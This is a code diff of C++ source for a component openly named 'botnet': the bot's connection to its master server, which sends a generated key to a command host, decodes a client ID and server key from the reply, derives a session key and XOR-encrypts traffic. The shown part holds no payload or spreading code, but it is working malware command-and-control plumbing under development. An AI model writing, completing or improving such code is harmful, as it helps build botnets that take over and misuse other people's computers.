@@ -1,22 +1,32 @@
 #include <iostream>
 #include <windows.h>
 #include <cmath>
+#include <vector>
 
 #include "master_conn.h"
 #include "http_client.h"
 #include "http_request.h"
 #include "define.h"
+#include "utils.h"
+#include "base64.h"
 
 namespace botnet{
     master_conn::master_conn() {
         typedef botnet::http::http_request http_request;
         typedef botnet::http::http_client http_client;
+        std::string content;
+        std::string confirm_srv;
+        std::vector<std::string> arr;
+        count_conn = 1;
+        char* alex = "alex";
 
         std::string host = HOST + ':' + std::to_string(PORT);
 
         http_request *http_req = new http_request(botnet::http::GET);
         http_request::headers header;
         header.add("Host", host);
+        client_key = keyGen();
+        confirm_msg = rand();
         std::string path = "?k_c=" + std::to_string(client_key) +
             "&confirm=" + std::to_string(confirm_msg);
 
@@ -26,7 +36,29 @@ namespace botnet{
         http_client *http_c = new http_client(HOST, PORT);
         http_c->request(http_req);
 
-        std::cout << http_c->getContent() << '\n';
+        std::cout << http_c->getContent() << "----------------\n";
+
+        content = http_c->getContent();
+        
+        arr = split(content, "\n");
+
+        if (arr.size() < 3)
+            return;
+
+        client_id = base64_decode(arr[1]);
+        std::cout << "client_id base64: " << arr[1] << '\n';
+        std::cout << "client_id: " << client_id << '\n';
+        hash_key = combineKeys(std::atoi(base64_decode(arr[2]).c_str()));
+        std::cout << "hash_key: " << hash_key << '\n';
+        std::cout << "Server Key: " << std::atoi(base64_decode(arr[2]).c_str()) << '\n';
+        confirm_srv = arr[3];
+
+        // Delete the last char because node put a \r in the end
+        confirm_srv = confirm_srv.substr(0, confirm_srv.length() - 1);
+        std::cout << "confirm_srv: " << confirm_srv.length() << '\n';
+        bool b = confirm(base64_decode(confirm_srv));
+
+        std::cout << "confirm: " << (b?"sim":"nao") << '\n';
     }
    
     int master_conn::keyGen() {
@@ -41,31 +73,33 @@ namespace botnet{
         base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
         r = (int) (INT_MAX / 2 + floor(rand() * INT_MAX / 2));
         key = base ^ r;
+        my_rand = r;
         return key;
     }
 
 
 	std::string master_conn::expand_key (std::string str_key){
-  		const std::string ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-		const int ALPHA_SIZE = ALPHA.length(); 
-  
-		std::string exp_key = "";
-	    int n = str_key.length();
-		int i = 0;
-		int index;
-	    for (i = 0; i < n/2; i++){
-			exp_key = exp_key
-		               + ALPHA[((int)str_key[i] + (int)str_key[i+1]) % ALPHA_SIZE]
-		               + ALPHA[(((int)str_key[i]) * ((int)str_key[n-i-1])) % ALPHA_SIZE];
-		}
-	    for (i = 0; i < n; i++){
-			index = (((int)ALPHA[((int)str_key[i]) % ALPHA_SIZE]) + i*i ) % ALPHA_SIZE;
-			exp_key = exp_key + ALPHA[index];
-		}
-		return exp_key;
+
+        std::string enc1 = base64_encode(reinterpret_cast<const unsigned char*>(
+            str_key.c_str()), str_key.length());
+
+        std::string enc2 = base64_encode(reinterpret_cast<const unsigned char*>(
+            enc1.c_str()), enc1.length());
+
+        std::string enc3 = base64_encode(reinterpret_cast<const unsigned char*>(
+            enc2.c_str()), enc2.length());
+
+        std::string enc4 = base64_encode(reinterpret_cast<const unsigned char*>(
+            enc3.c_str()), enc3.length());
+
+        std::string enc5 = base64_encode(reinterpret_cast<const unsigned char*>(
+            enc4.c_str()), enc4.length());
+
+        return enc5;        
 	}
 
 	std::string master_conn::combineKeys(int keyServer){
+        std::cout << "std::to_string(keyServer ^ my_rand): " << std::to_string(keyServer ^ my_rand) << '\n';
         return expand_key(std::to_string(keyServer ^ my_rand));
 	}
 
@@ -76,7 +110,7 @@ namespace botnet{
         int iv = count_conn;
         std::string k = hash_key; /* this.hash_key */;
 		for (i = 0; i < m.length(); i++){
-	    	c[i] = ((char)(iv ^ m[i] ^ k[j]));
+	    	c += ((char)(iv ^ m[i] ^ k[j]));
 			j = (j + 1) % k.length();
 			if (j == 0)
 				iv = (iv + 1) % 256;
@@ -85,8 +119,8 @@ namespace botnet{
 	}
 
 
-    bool confirm(std::string msg_from_server){
-		return encrypt(confirm_msg) == msg_from_server;
+    bool master_conn::confirm(std::string msg_from_server){
+		return encrypt(std::to_string(confirm_msg)) == msg_from_server;
 	}
 	
 	std::string master_conn::decrypt (std::string c){
@@ -96,11 +130,12 @@ namespace botnet{
         int iv = count_conn; /* this.count numero de conexoes */;
         std::string k = hash_key; /* this.expanded_private_key*/;
 		for (i = 0; i < c.length(); i++){
-			m[i] = (iv ^ c[i] ^ k[j]);
+			m += (iv ^ c[i] ^ k[j]);
             j = (j + 1) % k.length();
 	        if (j == 0)
 	        	iv = (iv + 1) % 256;
 		}
+
 		return m;
 	}
 
